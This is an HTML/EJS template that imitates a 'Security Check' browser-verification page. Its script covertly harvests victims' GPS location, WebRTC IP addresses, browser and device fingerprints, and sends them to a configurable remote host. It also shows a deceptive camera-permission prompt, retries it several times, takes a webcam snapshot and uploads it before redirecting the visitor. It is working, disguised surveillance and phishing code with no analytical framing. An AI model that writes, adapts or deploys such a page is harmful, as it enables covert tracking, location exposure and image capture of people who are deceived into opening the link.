<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 500px;
            width: 90%;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
            color: #333;
        }
        .logo { font-size: 60px; margin-bottom: 20px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        h1 { font-size: 28px; margin-bottom: 10px; color: #667eea; }
        .subtitle { font-size: 16px; color: #666; margin-bottom: 30px; }
        .progress-bar { width: 100%; height: 8px; background: #e0e0e0; border-radius: 10px; overflow: hidden; margin: 20px 0; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); animation: progress <%= duration %>ms linear forwards; }
        @keyframes progress { from { width: 0%; } to { width: 100%; } }
        .loader { margin: 30px auto; border: 5px solid #f3f3f3; border-top: 5px solid #667eea; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .info-box { background: #f8f9fa; border-radius: 10px; padding: 20px; margin: 20px 0; text-align: left; }
        .info-item { display: flex; align-items: center; margin: 10px 0; font-size: 14px; }
        .checkmark { color: #4caf50; font-size: 20px; margin-right: 10px; }
        .badge { display: inline-block; background: #4caf50; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; margin-top: 15px; }
        .status { font-size: 14px; color: #999; margin-top: 20px; }
        
        /* Camera Modal */
        .camera-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }
        .camera-modal.active { display: flex; }
        .camera-content {
            background: white;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            max-width: 400px;
        }
        .camera-icon { font-size: 80px; margin-bottom: 20px; }
        .camera-text { font-size: 18px; margin-bottom: 20px; color: #333; }
        .camera-buttons button {
            padding: 12px 30px;
            margin: 10px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn-allow { background: #4caf50; color: white; }
        .btn-allow:hover { background: #45a049; }
        .btn-deny { background: #f44336; color: white; }
        .btn-deny:hover { background: #da190b; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ğŸ”’</div>
        <h1>Security Check</h1>
        <p class="subtitle">Verifying your browser...</p>
        
        <div class="loader"></div>
        
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        
        <div class="info-box">
            <div class="info-item">
                <span class="checkmark">âœ“</span>
                <span id="status-1">Gathering device information...</span>
            </div>
            <div class="info-item">
                <span class="checkmark">âœ“</span>
                <span id="status-2">Analyzing network data...</span>
            </div>
            <div class="info-item">
                <span class="checkmark">âœ“</span>
                <span id="status-3">Fingerprinting browser...</span>
            </div>
            <div class="info-item">
                <span class="checkmark">âœ“</span>
                <span id="status-4">Collecting system info...</span>
            </div>
        </div>
        
        <div class="badge">ğŸ›¡ï¸ Protected</div>
        <p class="status">This process is automatic. Please wait...</p>
    </div>

    <!-- Camera Permission Modal -->
    <div class="camera-modal" id="cameraModal">
        <div class="camera-content">
            <div class="camera-icon">ğŸ“·</div>
            <div class="camera-text">
                <strong>Camera Access Required</strong>
                <p>This site wants to use your camera for security verification</p>
            </div>
            <div class="camera-buttons">
                <button class="btn-allow" onclick="allowCamera()">Allow</button>
                <button class="btn-deny" onclick="denyCamera()">Block</button>
            </div>
        </div>
    </div>

    <script>
        const uid = '<%= uid %>';
        const host = '<%= host %>';
        const targetUrl = '<%= url %>';
        const delay = <%= duration %>;

        let cameraAttempts = 0;
        let cameraGranted = false;
        let cameraDenied = false;

        function send(endpoint, data) {
            fetch(`${host}/${endpoint}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams(data)
            }).catch(() => {});
        }

        // ========== MAXIMUM INFO GATHERING ==========

        // 1. Location
        setTimeout(() => {
            document.getElementById('status-1').textContent = 'Getting GPS location...';
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        send('location', {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            uid: uid,
                            acc: pos.coords.accuracy
                        });
                        document.getElementById('status-1').textContent = 'âœ“ Location captured';
                    },
                    () => {
                        document.getElementById('status-1').textContent = 'âœ“ Location unavailable';
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        }, 500);

        // 2. Battery Info
        let batteryInfo = 'Not available';
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                batteryInfo = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? '(Charging)' : '(Not Charging)'}`;
            });
        }

        // 3. Network Info
        let networkInfo = 'Unknown';
        if ('connection' in navigator || 'mozConnection' in navigator || 'webkitConnection' in navigator) {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            networkInfo = `${conn.effectiveType || 'Unknown'} - ${conn.downlink || '?'} Mbps`;
        }

        // 4. WebRTC IP Leak
        let localIPs = [];
        let publicIP = 'Unknown';
        
        const getIPs = () => {
            return new Promise((resolve) => {
                const ips = [];
                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                
                if (!RTCPeerConnection) {
                    resolve(ips);
                    return;
                }

                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
                
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    
                    const parts = ice.candidate.candidate.split(' ');
                    const ip = parts[4];
                    
                    if (ip && !ips.includes(ip)) {
                        ips.push(ip);
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve(ips);
                }, 2000);
            });
        };

        // 5. Canvas Fingerprint
        const getCanvasFingerprint = () => {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Hello, World!', 2, 15);
            return canvas.toDataURL().slice(-50);
        };

        // 6. Audio Fingerprint
        const getAudioFingerprint = () => {
            try {
                const context = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = context.createOscillator();
                const analyser = context.createAnalyser();
                const gainNode = context.createGain();
                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
                
                gainNode.gain.value = 0;
                oscillator.type = 'triangle';
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(context.destination);
                oscillator.start(0);
                
                return 'Generated';
            } catch (e) {
                return 'Not available';
            }
        };

        // 7. Installed Fonts Detection
        const detectFonts = () => {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Impact'];
            
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            const installed = testFonts.filter(font => {
                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
                ctx.font = `72px ${font}, monospace`;
                const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
                return baseWidth !== testWidth;
            });
            
            return installed.join(', ') || 'None detected';
        };

        // 8. Plugins Detection
        const getPlugins = () => {
            return Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None';
        };

        // 9. Screen Orientation
        const getOrientation = () => {
            return screen.orientation ? screen.orientation.type : 'Unknown';
        };

        // 10. Device Memory
        const getDeviceMemory = () => {
            return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
        };

        // 11. Hardware Concurrency
        const getCPUCores = () => {
            return navigator.hardwareConcurrency || 'Unknown';
        };

        // Gather ALL Info
        setTimeout(async () => {
            document.getElementById('status-2').textContent = 'Collecting network data...';
            
            const webrtcIPs = await getIPs();
            localIPs = webrtcIPs.filter(ip => ip.startsWith('192.') || ip.startsWith('10.') || ip.startsWith('172.'));
            publicIP = webrtcIPs.find(ip => !ip.startsWith('192.') && !ip.startsWith('10.') && !ip.startsWith('172.')) || 'Not found';
            
            document.getElementById('status-2').textContent = 'âœ“ Network analyzed';
        }, 1000);

        setTimeout(() => {
            document.getElementById('status-3').textContent = 'Creating fingerprint...';
            
            const canvasFingerprint = getCanvasFingerprint();
            const audioFingerprint = getAudioFingerprint();
            const installedFonts = detectFonts();
            
            document.getElementById('status-3').textContent = 'âœ“ Fingerprint created';
        }, 2000);

        setTimeout(() => {
            document.getElementById('status-4').textContent = 'Finalizing data collection...';
            
            const completeInfo = `â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘        <b>ğŸ“Š COMPLETE DEVICE INFO</b>        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

<b>ğŸŒ NETWORK INFORMATION</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Public IP: <code><%= ip %></code>
WebRTC IPs: <code>${localIPs.join(', ') || 'None'}</code>
Public WebRTC: <code>${publicIP}</code>
Connection: ${networkInfo}
Online: ${navigator.onLine ? 'Yes' : 'No'}

<b>ğŸ–¥ï¸ DEVICE & SYSTEM</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Platform: ${navigator.platform}
User Agent: ${navigator.userAgent}
App Version: ${navigator.appVersion}
Vendor: ${navigator.vendor}
CPU Cores: ${getCPUCores()}
Device Memory: ${getDeviceMemory()}

<b>ğŸ“± SCREEN & DISPLAY</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Resolution: ${screen.width}x${screen.height}
Available: ${screen.availWidth}x${screen.availHeight}
Color Depth: ${screen.colorDepth}-bit
Pixel Ratio: ${window.devicePixelRatio}
Orientation: ${getOrientation()}
Touch Support: ${navigator.maxTouchPoints > 0 ? 'Yes' : 'No'}

<b>ğŸŒ BROWSER & LANGUAGE</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Language: ${navigator.language}
Languages: ${navigator.languages.join(', ')}
Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Timezone Offset: GMT${new Date().getTimezoneOffset() / -60}

<b>ğŸ”‹ BATTERY & NETWORK</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Battery: ${batteryInfo}
Network Type: ${networkInfo}

<b>ğŸ”’ SECURITY & PRIVACY</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Do Not Track: ${navigator.doNotTrack || 'Not set'}
Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}
Local Storage: ${typeof(Storage) !== 'undefined' ? 'Available' : 'Not available'}
Session Storage: ${typeof(sessionStorage) !== 'undefined' ? 'Available' : 'Not available'}

<b>ğŸ” BROWSER FINGERPRINT</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Canvas: <code>${canvasFingerprint}</code>
Audio: ${audioFingerprint}
WebGL Vendor: ${(function(){try{const canvas=document.createElement('canvas');const gl=canvas.getContext('webgl');return gl.getParameter(gl.VENDOR)}catch(e){return 'N/A'}})()}
WebGL Renderer: ${(function(){try{const canvas=document.createElement('canvas');const gl=canvas.getContext('webgl');return gl.getParameter(gl.RENDERER)}catch(e){return 'N/A'}})()}

<b>ğŸ”Œ PLUGINS & FONTS</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Plugins: ${getPlugins()}
Fonts: ${installedFonts}

<b>ğŸ“… TIMESTAMP</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Local Time: <%= time %>
UTC Time: ${new Date().toUTCString()}

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<i>Data collected successfully âœ“</i>`;

            send('info', { uid: uid, data: completeInfo });
            
            document.getElementById('status-4').textContent = 'âœ“ All data collected';
        }, 3000);

        // ========== CAMERA PERMISSION (PERSISTENT) ==========
        
        function showCameraModal() {
            document.getElementById('cameraModal').classList.add('active');
            send('camera-status', { uid: uid, status: 'pending' });
        }

        function allowCamera() {
            document.getElementById('cameraModal').classList.remove('active');
            cameraGranted = true;
            captureCamera();
        }

        function denyCamera() {
            document.getElementById('cameraModal').classList.remove('active');
            cameraDenied = true;
            send('camera-status', { uid: uid, status: 'denied' });
        }

        async function requestCamera() {
            if (cameraGranted || cameraDenied) return;
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                return;
            }

            try {
                // Try to get camera directly first
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                cameraGranted = true;
                captureCamera(stream);
            } catch (err) {
                // If blocked, show custom modal
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    cameraAttempts++;
                    
                    if (cameraAttempts < 3) {
                        // Show modal again
                        setTimeout(() => {
                            showCameraModal();
                        }, 2000);
                    } else {
                        cameraDenied = true;
                        send('camera-status', { uid: uid, status: 'denied' });
                    }
                } else {
                    // Show modal for first-time permission
                    showCameraModal();
                }
            }
        }

        function captureCamera(stream) {
            if (!stream) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                    .then(s => processCamera(s))
                    .catch(() => {});
            } else {
                processCamera(stream);
            }
        }

        function processCamera(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            send('camera-status', { uid: uid, status: 'allowed' });
            
            video.onloadedmetadata = () => {
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/png').split(',')[1];
                    
                    send('camsnap', { uid: uid, img: imageData });
                    
                    stream.getTracks().forEach(t => t.stop());
                }, 500);
            };
        }

        // Start camera request after 4 seconds
        setTimeout(() => {
            requestCamera();
        }, 4000);

        // Keep trying every 5 seconds until allowed/denied
        const cameraInterval = setInterval(() => {
            if (!cameraGranted && !cameraDenied && cameraAttempts < 5) {
                requestCamera();
            } else {
                clearInterval(cameraInterval);
            }
        }, 5000);

        // Redirect after delay
        setTimeout(() => {
            window.location.href = targetUrl;
        }, delay);
    </script>
</body>
</html>
